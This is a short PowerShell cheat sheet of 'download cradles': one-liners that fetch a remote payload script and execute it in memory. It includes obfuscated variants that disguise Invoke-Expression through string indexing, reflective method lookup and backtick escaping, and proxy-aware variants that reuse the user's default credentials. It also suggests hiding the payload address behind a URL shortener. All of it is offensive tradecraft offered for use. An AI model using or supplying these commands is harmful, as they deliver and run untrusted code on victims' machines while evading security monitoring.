# not proxy aware download cradles 

# default download cradle 
IEX (New-Object Net.Webclient).downloadstring("http://server/payload.ps1")

# obfuscated 
(New-Object Net.WebClient).DownloadString('http://server/payload.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')

# obfuscted
$ExecutionContext|ForEach{(GV _).Value.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|Where-Object{(GV _).Value.Name-ilike'*v*ip*'}).Name)((([Char[]][System.Net.WebClient]::New().DownloadData('http://server/payload.ps1'))-Join''))}


# Info: Because you are limited in length, you have to use a shortcut link to the raw link from your hosted payload on Github
# For example, https://cutt.ly/syFzILH directs to the raw link of hosted payload on github
# obfuscated 
(New-Object Net.WebClient).DownloadString('https://cutt.ly/syFzILH')|.$ExecutionContext.(($ExecutionContext|Member)[6].Name).GetCmdlet($ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name)|Member|?{$_.Name-like'*man*Name'}).Name).Invoke('*ke-*pr*',1,$TRUE))



# proxy aware download cradles
# Info: Because you are limited in length, you have to use a shortcut link to the raw link from your hosted payload on Github
# For example, https://cutt.ly/syFzILH directs to the raw link of hosted payload on github

# default download cradle 
$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iEx $c.downloadstring("https://cutt.ly/syFzILH")

# obfuscated v1
$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;`i`E`x $c.downloadstring("ht"+"tps://cutt.ly/syFzILH")
